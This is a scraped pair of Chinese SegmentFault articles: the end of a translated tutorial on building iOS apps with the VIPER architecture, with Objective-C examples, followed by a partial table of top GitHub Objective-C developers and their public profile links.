<p>下面是不同组件的示意图以及它们的相互联系：</p>

<p><span class=""img-wrap""><img data-src=""http://i.imgur.com/uhGCId3.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""用VIPER构建iOS应用架构""></span></p>

<p>虽然 VIPER 的组件在应用中可以以任意顺序组合实现，这里我们选择以推荐的实现顺序来介绍组件。你会发现，这个顺序与应用的构建过程基本一致，首先讨论应用产品需要做什么，其次是用户如何与它进行交互。</p>

<h2>交互器</h2>

<p>交互代表应用程序中的一个用例，它包含业务逻辑用来操纵模型对象（实体）以进行特定任务。交互器所做的工作应该是独立于任何用户界面的。同样的交互器可以在 iOS 应用或 OS X 应用中使用。</p>

<p>因为交互器是一个 PONSO（普通老式 NSObject），它主要包含逻辑，很容易使用 TDD 来开发。</p>

<p>示例程序的主要用例是显示用户接下来的待办事项（即截止于下周末之前的任务）。这个用例的业务逻辑是，寻找今天到下周末之间的待办事项，分配到相对的截止日期：今天、明天、本周后几天或下周。</p>

<p>下面是 VTDListInteractor 的类似方法：</p>

<pre><code>- (void)findUpcomingItems
{
    __weak typeof(self) welf = self;
    NSDate* today = [self.clock today];
    NSDate* endOfNextWeek = [[NSCalendar currentCalendar] dateForEndOfFollowingWeekWithDate:today];
    [self.dataManager todoItemsBetweenStartDate:today endDate:endOfNextWeek completionBlock:^(NSArray* todoItems) {
        [welf.output foundUpcomingItems:[welf upcomingItemsFromToDoItems:todoItems]];
    }];
}
</code></pre>

<h2>实体</h2>

<p>实体是由交互器操纵的模型对象（仅由交互器操控），交互器不会将实体传递到表现层（即展示器）。</p>

<p>实体往往也是 PONSOs。如果你正在使用核心数据，你会希望你的管理对象最好保持在数据层后端。交互器不能直接使用 NSManagedObjects。</p>

<p>这是示例应用的实体：</p>

<pre><code>@interface VTDTodoItem : NSObject

@property (nonatomic, strong)   NSDate*     dueDate;
@property (nonatomic, copy)     NSString*   name;

+ (instancetype)todoItemWithDueDate:(NSDate*)dueDate name:(NSString*)name;

@end
</code></pre>

<p>如果你的实体都只是数据结构也别太惊讶，任何依赖于程序的逻辑，都应该在交互器中。</p>

<h2>展示器</h2>

<p>展示器是一个 PONSO，主要由逻辑组成来驱动用户界面。它知道何时呈现用户界面，收集用户交互过程的输入，用于实时更新 UI，并像交互器发送响应请求。</p>

<p>当用户点击<code>+</code>按钮来添加新的待办事项，addNewEntry 被调用。为了响应操作，展示器调用线框来显示添加一个新项目的 UI：</p>

<pre><code>- (void)addNewEntry
{
    [self.listWireframe presentAddInterface];
}
</code></pre>

<p>展示器还可以显示交互器接收结果，并将结果转换成其它能在视图中有效展示的形式。</p>

<p>下面是从展示器接收到待办事项后所调用的方法。它将处理相关数据，并确定将哪些内容展现给用户：</p>

<pre><code>- (void)foundUpcomingItems:(NSArray*)upcomingItems
{
    if ([upcomingItems count] == 0)
    {
        [self.userInterface showNoContentMessage];
    }
    else
    {
        [self updateUserInterfaceWithUpcomingItems:upcomingItems];
    }
}
</code></pre>

<p>实体从来不会从交互器传输到展示器。相反，那些无行为的简单数据结构却可以传输。这样可以防止任何「实际工作」在展示器中进行。展示器只负责准备视图显示中的数据。</p>

<h2>视图</h2>

<p>视图通常是被动的。它显示展示器传输来的内容；却不能向展示器主动请求数据。为一个视图定义的方法（例如 LoginView 需要登录界面），应该允许展示器在更高的抽象级进行通信，展示器直接展示其内容，而不关心该内容要如何显示。展示器不知道 UILabel、UIButton 等控件，只知道维护内容以及显示时机。内容要如何展示完全取决于视图。</p>

<p>视图是一个抽象的接口，适用协议用 Objective-C 中定义。一个 UIViewController 或它的子类将实现 View 协议。例如本例中的「添加」界面有如下接口：</p>

<pre><code>@protocol VTDAddViewInterface &lt;NSObject&gt;

- (void)setEntryName:(NSString *)name;
- (void)setEntryDueDate:(NSDate *)date;

@end
</code></pre>

<p>视图和视图控制器还处理用户交互和用户输入。所以不难理解为什么视图控制器通常很庞大，因为他们最容易处理用户输入并执行相关动作。为了保持视图控制器倾斜，需要让它们在用户采取某些动作后，通知有效途径告知有关各方。视图控制器不对用户动作做出响应，只将事件传递给响应方法。</p>

<p>本例中，添加视图控制器的事件处理属性，有如下接口：</p>

<pre><code>@protocol VTDAddModuleInterface &lt;NSObject&gt;

- (void)cancelAddAction;
- (void)saveAddActionWithName:(NSString *)name dueDate:(NSDate *)dueDate

@end
</code></pre>

<p>当用户点击取消按钮，视图控制器告知事件处理机制，用户需要取消此添加操作。这样一来，该事件处理机制可以取消添加视图控制器，并告知列表视图以更新。</p>

<p>视图和展示器之间的边界可用于 <a rel=""nofollow"" href=""https://github.com/ReactiveCocoa/ReactiveCocoa"">ReactiveCocoa</a>。在本例中，视图控制器还能提供方法以返回表示按钮动作的信号。这将允许展示器更容易地对信号做出反馈，而无需破坏责任区域的独立。</p>

<h2>路由</h2>

<p>界面之间的路由在交互设计师创建的线框中定义。在 VIPER 中，路由的任务是实现展示器和线框之间的共享。线框对象包括 theUIWindow、UINavigationController 和 UIViewController 等，它负责创建视图/视图控制器，并在窗口中完成装配。</p>

<p>由于展示器包含响应用户输入的逻辑，所以它知道何时该导航到其他屏幕，应导航到哪个界面，同时，线框知道如何进行导航。展示器主要使用线框实现导航功能。线框和展示器协同描述一个屏幕到下一个的路由的过程。</p>

<p>线框便于处理导航过渡动画。来看看下面添加线框的例子：</p>

<pre><code>@implementation VTDAddWireframe

- (void)presentAddInterfaceFromViewController:(UIViewController *)viewController 
{
    VTDAddViewController *addViewController = [self addViewController];
    addViewController.eventHandler = self.addPresenter;
    addViewController.modalPresentationStyle = UIModalPresentationCustom;
    addViewController.transitioningDelegate = self;

    [viewController presentViewController:addViewController animated:YES completion:nil];

    self.presentedViewController = viewController;
}

#pragma mark - UIViewControllerTransitioningDelegate Methods

- (id&lt;UIViewControllerAnimatedTransitioning&gt;)animationControllerForDismissedController:(UIViewController *)dismissed 
{
    return [[VTDAddDismissalTransition alloc] init];
}

- (id&lt;UIViewControllerAnimatedTransitioning&gt;)animationControllerForPresentedController:(UIViewController *)presented
                                                                presentingController:(UIViewController *)presenting
                                                                    sourceController:(UIViewController *)source 
{
    return [[VTDAddPresentationTransition alloc] init];
}

@end
</code></pre>

<p>该应用程序使用自定义视图控制器过渡来添加视图控制器。由于线框负责执行过渡，它成为添加视图控制器的过渡委托，并能返回恰当的过渡动画。</p>

<h2>用 VIPER 组织应用组件</h2>

<p>建造 iOS 应用的架构时需要明白，作为主要开发工具，UIKit 和 Cocaa Touch 的作用是打造应用的「门面」。架构需要与应用的所有组件和平共处，但它也需要为部分框架的使用，以及处于什么位置提供建议。</p>

<p>iOS 应用的主力是 UIViewController，它很时常被认为是取代 MVC 的竞争者，能大量减少使用视图控制器。但是视图控制器是平台的中心：他们处理方向变化、响应用户输入、集成系统组件比如导航控制器。（未完待续...）</p>

<p><strong>敬请持续关注：《用 VIPER 构建 iOS 应用架构》系列（2）.</strong></p>

<p>原文地址：<a rel=""nofollow"" href=""http://www.objc.io/issues/13-architecture/viper/"">Architecting iOS Apps with VIPER</a></p>

<p><strong>本文由<a rel=""nofollow"" href=""http://www.oneapm.com/?hmsr=media&amp;hmmd=&amp;hmpl=&amp;hmkw=&amp;hmci="">OneAPM</a>工程师编译 ，想阅读更多技术文章，请访问<a rel=""nofollow"" href=""http://code.oneapm.com/?hmsr=media&amp;hmmd=&amp;hmpl=&amp;hmkw=&amp;hmci="">OneAPM官方技术博客</a>。</strong></p>

                ", 用 VIPER 构建 iOS 应用架构（1）,1531972103,491,1,268,1,1,https://segmentfault.com/a/1190000003051896
145,1,0,6,"
                    
<h2>GitHub Top Users Objective-C World</h2>

<p>这是GitHub在世界范围内排名前50的Objective-C程序员，并且列出相关信息，从而可以走近他们的程序世界。</p>

<p>数据来自GitHub的API以及自己整理的相关内容。</p>

<p>原文链接:<br><a rel=""nofollow"" href=""https://github.com/coderyi/Monkey/blob/master/github_top_users_repositories/github_top_users_objective-c_world.md"">Objective-C top 50 GitHub developers</a></p>

<table>
<thead><tr>
<th>Rank</th>
  <th>Users</th>
  <th>基本信息</th>
  <th>简介</th>
</tr></thead>
<tbody>
<tr>
<td>1</td>
  <td>
<strong>Wei Wang</strong><br><a rel=""nofollow"" href=""https://github.com/onevcat"">onevcat</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/1019875?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""onevcat""></span>
</td>
  <td>name: ""Wei Wang""<br>company: ""LINE Corp.""<br>blog: ""<a rel=""nofollow"" href=""http://onevcat.com/"">http://onevcat.com/</a>""<br>location: ""Kawasaki, Japan""<br>email: ""onev@onevcat.com""</td>
  <td>作品:<br><a rel=""nofollow"" href=""http://swifter.tips/buy"">《Swifter - 100 个 Swift 必备 tips》</a><br><a rel=""nofollow"" href=""https://github.com/onevcat/VVDocumenter-Xcode"">VVDocumenter-Xcode</a>:Xcode plug-in which helps you write Javadoc style documents easier.<br><br>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/in/onevcat"">Wei Wang</a><br>twitter:<a rel=""nofollow"" href=""https://twitter.com/onevcat"">https://twitter.com/onevcat</a>
</td>
</tr>
<tr>
<td>2</td>
  <td>
<strong>Sam Soffes</strong><br><a rel=""nofollow"" href=""https://github.com/soffes"">soffes</a> <br><span class=""img-wrap""><img data-src=""https://avatars.githubusercontent.com/u/52870?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""soffes""></span>
</td>
  <td>name: ""Sam Soffes""<br>company: ""Venmo""<br>blog: ""<a rel=""nofollow"" href=""http://soff.es"">http://soff.es</a>""<br>location: ""San Francisco""<br>email: ""sam@soff.es""</td>
  <td>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/in/steipete"">Sam Soffes</a><br>twitter:<a rel=""nofollow"" href=""https://twitter.com/soffesX"">https://twitter.com/soffesX</a>28Xabout:<a rel=""nofollow"" href=""http://soff.es/about"">http://soff.es/about</a>
</td>
</tr>
<tr>
<td>3</td>
  <td>
<strong>Nick Lockwood</strong><br><a rel=""nofollow"" href=""https://github.com/nicklockwood"">nicklockwood</a> <br><span class=""img-wrap""><img data-src=""https://avatars.githubusercontent.com/u/546885?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""nicklockwood""></span>
</td>
  <td>name: ""Nick Lockwood""<br>company: ""Charcoal Design""<br>blog: ""<a rel=""nofollow"" href=""http://charcoaldesign.co.uk"">http://charcoaldesign.co.uk</a>""<br>location: ""UK""<br>email: ""support@charcoaldesign.co.uk""</td>
  <td>作品:<br><a rel=""nofollow"" href=""https://github.com/nicklockwood/iCarousel"">iCarousel</a>:A simple, highly customisable, data-driven 3D carousel for iOS and Mac OS<br><br>twitter:<a rel=""nofollow"" href=""https://twitter.com/nicklockwood"">https://twitter.com/nicklockwood</a>
</td>
</tr>
<tr>
<td>4</td>
  <td>
<strong>Peter Steinberger</strong><br><a rel=""nofollow"" href=""https://github.com/steipete"">steipete</a> <br><span class=""img-wrap""><img data-src=""https://avatars.githubusercontent.com/u/58493?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""steipete""></span>
</td>
  <td>name: ""Peter Steinberger""<br>company: ""PSPDFKit GmbH""<br>blog: ""<a rel=""nofollow"" href=""http://petersteinberger.com"">http://petersteinberger.com</a>""<br>location: ""Vienna, Austria""<br>email: ""steipete@gmail.com""</td>
  <td>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/in/steipete"">Peter Steinberger</a><br>twitter:<a rel=""nofollow"" href=""https://twitter.com/steipete"">https://twitter.com/steipete</a>
</td>
</tr>
<tr>
<td>5</td>
  <td>
<strong>Erica Sadun</strong><br><a rel=""nofollow"" href=""https://github.com/erica"">erica</a> <br><span class=""img-wrap""><img data-src=""https://avatars.githubusercontent.com/u/32688?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""erica""></span>
</td>
  <td>name: ""Erica Sadun""<br>blog: ""<a rel=""nofollow"" href=""http://ericasadun.com"">http://ericasadun.com</a>""<br>location: ""Denver, CO""<br>email: ""erica@ericasadun.com""<br>
</td>
  <td>
<br>twitter:<a rel=""nofollow"" href=""https://twitter.com/ericasadun"">https://twitter.com/ericasadun</a>
</td>
</tr>
<tr>
<td>6</td>
  <td>
<strong>Max Howell</strong><br><a rel=""nofollow"" href=""https://github.com/mxcl"">mxcl</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/58962?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""mxcl""></span>
</td>
  <td>name: ""Max Howell""<br>company: """"<br>blog: ""<a rel=""nofollow"" href=""https://github.com/Homebrew/homebrew/commit/29d85578e75170a6c0eaebda4d701b46f1acf446"">mxcl's blog</a>""<br>location: ""Chicago""<br>email: ""mxcl@me.com""</td>
  <td>作品:<br><a rel=""nofollow"" href=""https://github.com/Homebrew"">Homebrew</a>:The missing package manager for OS X.<br><br>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/in/maxhowell"">Max Howell</a>
</td>
</tr>
<tr>
<td>7</td>
  <td>
<strong>Mike Ash</strong><br><a rel=""nofollow"" href=""https://github.com/mikeash"">mikeash</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/350427?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""mikeash""></span>
</td>
  <td>name: ""Mike Ash""<br>company: null<br>blog: ""<a rel=""nofollow"" href=""http://mikeash.com/"">http://mikeash.com/</a>""<br>location: null<br>email: ""mike@mikeash.com""</td>
  <td>
<br>twitter:<a rel=""nofollow"" href=""https://twitter.com/mikeash"">https://twitter.com/mikeash</a>
</td>
</tr>
<tr>
<td>8</td>
  <td>
<strong>M了个J</strong><br><a rel=""nofollow"" href=""https://github.com/CoderMJLee"">CoderMJLee</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/3817366?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""CoderMJLee""></span>
</td>
  <td>name: ""M了个J""<br>company: ""小码哥 <a rel=""nofollow"" href=""http://www.520it.com"">http://www.520it.com</a>""<br>blog: ""<a rel=""nofollow"" href=""http://www.weibo.com/exceptions"">http://www.weibo.com/exceptions</a>""<br>location: ""Guangzhou, China""<br>email: ""richermj123go@vip.qq.com""</td>
  <td>作品：<br><a rel=""nofollow"" href=""https://github.com/CoderMJLee/MJRefresh"">MJRefresh</a>:The easiest way to use pull-to-refresh</td>
</tr>
<tr>
<td>9</td>
  <td>
<strong>Tang Qiao</strong><br><a rel=""nofollow"" href=""https://github.com/tangqiaoboy"">tangqiaoboy</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/733097?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""tangqiaoboy""></span>
</td>
  <td>name: ""Tang Qiao""<br>company: ""yuantiku.com""<br>blog: ""<a rel=""nofollow"" href=""http://devtang.com"">http://devtang.com</a>""<br>location: ""Beijing, China""</td>
  <td>作品:<br><a rel=""nofollow"" href=""http://book.douban.com/subject/26287173/"">《iOS 开发进阶》</a>
</td>
</tr>
<tr>
<td>10</td>
  <td>
<strong>marcoarment</strong><br><a rel=""nofollow"" href=""https://github.com/marcoarment"">marcoarment</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/366193?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""marcoarment""></span>
</td>
  <td></td>
  <td></td>
</tr>
<tr>
<td>11</td>
  <td>
<strong>Justin Spahr-Summers</strong><br><a rel=""nofollow"" href=""https://github.com/jspahrsummers"">jspahrsummers</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/432536?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""jspahrsummers""></span>
</td>
  <td>name: ""Justin Spahr-Summers""<br>company: """"<br>blog: ""<a rel=""nofollow"" href=""http://jspahrsummers.com"">http://jspahrsummers.com</a>""<br>location: ""San Francisco, CA""<br>email: ""justin@jspahrsummers.com""</td>
  <td>
<br>twitter:<a rel=""nofollow"" href=""https://twitter.com/jspahrsummers"">https://twitter.com/jspahrsummers</a>
</td>
</tr>
<tr>
<td>12</td>
  <td>
<strong>Matt Gemmell</strong><br><a rel=""nofollow"" href=""https://github.com/mattgemmell"">mattgemmell</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/144873?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""mattgemmell""></span>
</td>
  <td>name: ""Matt Gemmell""<br>company: """"<br>blog: ""<a rel=""nofollow"" href=""http://mattgemmell.com/"">http://mattgemmell.com/</a>""<br>location: ""Edinburgh, Scotland""<br>email: ""matt@mattgemmell.com""<br>
</td>
  <td>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/in/mattgemmell"">Matt Gemmell</a>
</td>
</tr>
<tr>
<td>13</td>
  <td>
<strong>Lex Tang</strong><br><a rel=""nofollow"" href=""https://github.com/lexrus"">lexrus</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/219689?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""lexrus""></span>
</td>
  <td>name: ""Lex Tang""<br>company: ""XinweiCook.com""<br>blog: ""<a rel=""nofollow"" href=""http://lexrus.com/"">http://lexrus.com/</a>""<br>location: ""Shanghai China""<br>email: ""lexrus@gmail.com""</td>
  <td>作品:<br><a rel=""nofollow"" href=""https://github.com/lexrus/LTMorphingLabel"">LTMorphingLabel</a>:Graceful morphing effects for UILabel written in Swift.<br><br>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/in/lexrus"">Lex Tang</a>
</td>
</tr>
<tr>
<td>14</td>
  <td>
<strong>Robbie Hanson</strong><br><a rel=""nofollow"" href=""https://github.com/robbiehanson"">robbiehanson</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/304604?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""robbiehanson""></span>
</td>
  <td>name: ""Robbie Hanson""<br>blog: ""<a rel=""nofollow"" href=""http://deusty.blogspot.com/"">http://deusty.blogspot.com/</a>""<br>location: ""Bend, Oregon""</td>
  <td>作品:<br><a rel=""nofollow"" href=""https://github.com/robbiehanson/CocoaAsyncSocket"">CocoaAsyncSocket</a>:Asynchronous socket networking library for Mac and iOS<br><br>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/pub/robbie-hanson/28/142/298/zh-cn"">Robbie Hanson</a>
</td>
</tr>
<tr>
<td>15</td>
  <td>
<strong>Roman Efimov</strong><br><a rel=""nofollow"" href=""https://github.com/romaonthego"">romaonthego</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/481100?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""romaonthego""></span>
</td>
  <td>name: ""Roman Efimov""<br>company: ""Yahoo! Inc.""<br>blog: ""twitter.com/romaonthego""<br>location: ""San Francisco Bay Area""<br>email: ""romefimov@gmail.com""</td>
  <td>作品:<br><a rel=""nofollow"" href=""https://github.com/romaonthego/RESideMenu"">RESideMenu</a>:iOS 7/8 style side menu with parallax effect.<br><br>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/in/romanefimov"">https://www.linkedin.com/in/romanefimov</a>
</td>
</tr>
<tr>
<td>16</td>
  <td>
<strong>Sam Vermette</strong><br><a rel=""nofollow"" href=""https://github.com/samvermette"">samvermette</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/265901?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""samvermette""></span>
</td>
  <td>name: ""Sam Vermette""<br>company: ""Transit App""<br>blog: ""<a rel=""nofollow"" href=""http://samvermette.com"">http://samvermette.com</a>""<br>location: ""Montréal""</td>
  <td>作品:<br><a rel=""nofollow"" href=""https://github.com/samvermette/SVPullToRefresh"">SVPullToRefresh</a>:Give pull-to-refresh &amp; infinite scrolling to any UIScrollView with 1 line of code.</td>
</tr>
<tr>
<td>17</td>
  <td>
<strong>Ash Furrow</strong><br><a rel=""nofollow"" href=""https://github.com/ashfurrow"">ashfurrow</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/498212?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""ashfurrow""></span>
</td>
  <td>name: ""Ash Furrow""<br>company: ""Artsy""<br>blog: ""<a rel=""nofollow"" href=""http://ashfurrow.com"">http://ashfurrow.com</a>""<br>location: """"<br>email: ""ash@ashfurrow.com""<br>
</td>
  <td>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/pub/ash-furrow/26/871/78"">Ash Furrow</a>
</td>
</tr>
<tr>
<td>18</td>
  <td>
<strong>Ryan Petrich</strong><br><a rel=""nofollow"" href=""https://github.com/rpetrich"">rpetrich</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/142515?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""rpetrich""></span>
</td>
  <td>name: ""Ryan Petrich""<br>company: null<br>blog: ""<a rel=""nofollow"" href=""http://rpetri.ch/"">http://rpetri.ch/</a>""<br>location: """"<br>email: ""rpetrich@gmail.com""<br>
</td>
  <td>twitter:<a rel=""nofollow"" href=""https://twitter.com/rpetrich"">https://twitter.com/rpetrich</a>
</td>
</tr>
<tr>
<td>19</td>
  <td>
<strong>Jack</strong><br><a rel=""nofollow"" href=""https://github.com/xhzengAIB"">xhzengAIB</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/1969908?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""xhzengAIB""></span>
</td>
  <td>name: ""Jack""<br>company: ""JackTeam &amp;&amp; duowan""<br>blog: ""<a rel=""nofollow"" href=""http://www.pailixiu.com/Jack/personal/"">http://www.pailixiu.com/Jack/personal/</a>""<br>location: ""China GuangDong (广州)""<br>email: ""xhzengAIB@gmail.com""<br>
</td>
  <td></td>
</tr>
<tr>
<td>20</td>
  <td>
<strong>Jeff Verkoeyen</strong><br><a rel=""nofollow"" href=""https://github.com/jverkoey"">jverkoey</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/45670?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""jverkoey""></span>
</td>
  <td>name: ""Jeff Verkoeyen""<br>company: """"<br>blog: ""<a rel=""nofollow"" href=""http://JeffVerkoeyen.com/"">http://JeffVerkoeyen.com/</a>""<br>location: ""New York, NY""<br>email: ""jverkoey@gmail.com"",</td>
  <td>作品:<br><a rel=""nofollow"" href=""https://github.com/jverkoey/nimbus"">nimbus</a>:The iOS framework that grows only as fast as its documentation<br><br>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/in/jeffverkoeyen"">https://www.linkedin.com/in/jeffverkoeyen</a>
</td>
</tr>
<tr>
<td>21</td>
  <td>
<strong>Mugunth Kumar</strong><br><a rel=""nofollow"" href=""https://github.com/MugunthKumar"">MugunthKumar</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/129776?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""MugunthKumar""></span>
</td>
  <td>name: ""Mugunth Kumar""<br>company: ""Steinlogic Consulting and Training Pte Ltd""<br>blog: ""<a rel=""nofollow"" href=""http://blog.mugunthkumar.com/"">http://blog.mugunthkumar.com/</a>""<br>location: ""Singapore""<br>email: ""mugunth@steinlogic.com""<br>
</td>
  <td>作品:<br><a rel=""nofollow"" href=""https://github.com/MugunthKumar/MKNetworkKit"">MKNetworkKit</a>:ARC ready Networking Framework with built in authentication and HTTP 1.1 caching standards support for iOS 5+ devices<br><br>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/in/mugunthkumar"">https://www.linkedin.com/in/mugunthkumar</a>
</td>
</tr>
<tr>
<td>22</td>
  <td>
<strong>Loren Brichter</strong><br><a rel=""nofollow"" href=""https://github.com/atebits"">atebits</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/40109?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""atebits""></span>
</td>
  <td>name: ""Loren Brichter""<br>company: ""atebits""<br>blog: ""<a rel=""nofollow"" href=""http://www.atebits.com/news/"">http://www.atebits.com/news/</a>""<br>location: ""Philly""<br>email: ""loren.brichter@atebits.com""<br>
</td>
  <td>twitter:<a rel=""nofollow"" href=""https://twitter.com/lorenb"">https://twitter.com/lorenb</a>
</td>
</tr>
<tr>
<td>23</td>
  <td>
<strong>Josh Abernathy</strong><br><a rel=""nofollow"" href=""https://github.com/joshaber"">joshaber</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/13760?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""joshaber""></span>
</td>
  <td>name: ""Josh Abernathy""<br>company: ""GitHub""<br>blog: ""<a rel=""nofollow"" href=""http://twitter.com/joshaber"">http://twitter.com/joshaber</a>""<br>location: ""The Gem City""<br>email: ""joshaber@gmail.com""</td>
  <td></td>
</tr>
<tr>
<td>24</td>
  <td>
<strong>Orta</strong><br><a rel=""nofollow"" href=""https://github.com/orta"">orta</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/49038?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""orta""></span>
</td>
  <td>name: ""Orta""<br>company: ""Artsy.net &amp;&amp; CocoaPods""<br>blog: ""<a rel=""nofollow"" href=""http://orta.github.io"">http://orta.github.io</a>""<br>location: ""Manchester / NYC""<br>email: ""orta.therox@gmail.com""<br>
</td>
  <td>twitter:<a rel=""nofollow"" href=""https://twitter.com/orta"">https://twitter.com/orta</a>
</td>
</tr>
<tr>
<td>25</td>
  <td>
<strong>Oliver Drobnik</strong><br><a rel=""nofollow"" href=""https://github.com/Cocoanetics"">Cocoanetics</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/333270?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Cocoanetics""></span>
</td>
  <td>name: ""Oliver Drobnik""<br>company: ""Drobnik KG""<br>blog: ""<a rel=""nofollow"" href=""http://www.cocoanetics.com"">http://www.cocoanetics.com</a>""<br>location: ""Vienna, Austria""<br>email: ""oliver@cocoanetics.com""<br>
</td>
  <td></td>
</tr>
<tr>
<td>26</td>
  <td>
<strong>Jonathan 'Wolf' Rentzsch</strong><br><a rel=""nofollow"" href=""https://github.com/rentzsch"">rentzsch</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/2971?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""rentzsch""></span>
</td>
  <td>name: ""Jonathan 'Wolf' Rentzsch""<br>company: """"<br>blog: ""<a rel=""nofollow"" href=""http://rentzsch.com"">http://rentzsch.com</a>""<br>location: ""Chicagoland+WI""<br>
</td>
  <td>twitter:<a rel=""nofollow"" href=""https://twitter.com/rentzsch"">https://twitter.com/rentzsch</a>
</td>
</tr>
<tr>
<td>27</td>
  <td>
<strong>Ryan Nystrom</strong><br><a rel=""nofollow"" href=""https://github.com/rnystrom"">rnystrom</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/739696?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""rnystrom""></span>
</td>
  <td>name: ""Ryan Nystrom""<br>company: ""Facebook""<br>blog: ""whoisryannystrom.com""<br>location: ""San Francisco, CA""<br>email: ""rnystrom@whoisryannystrom.com""<br>
</td>
  <td>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/in/ryannystrom"">https://www.linkedin.com/in/ryannystrom</a>
</td>
</tr>
<tr>
<td>28</td>
  <td>
<strong>Olivier Poitrey</strong><br><a rel=""nofollow"" href=""https://github.com/rs"">rs</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/68232?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""rs""></span>
</td>
  <td>name: ""Olivier Poitrey""<br>company: ""Dailymotion""<br>blog: ""<a rel=""nofollow"" href=""http://www.dailymotion.com"">http://www.dailymotion.com</a>""<br>location: ""Silicon Valley, California, USA""</td>
  <td>作品:<br><a rel=""nofollow"" href=""https://github.com/rs/SDWebImage"">SDWebImage</a>:Asynchronous image downloader with cache support with an UIImageView category<br><br>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/in/rsoliv"">https://www.linkedin.com/in/rsoliv</a>
</td>
</tr>
<tr>
<td>29</td>
  <td>
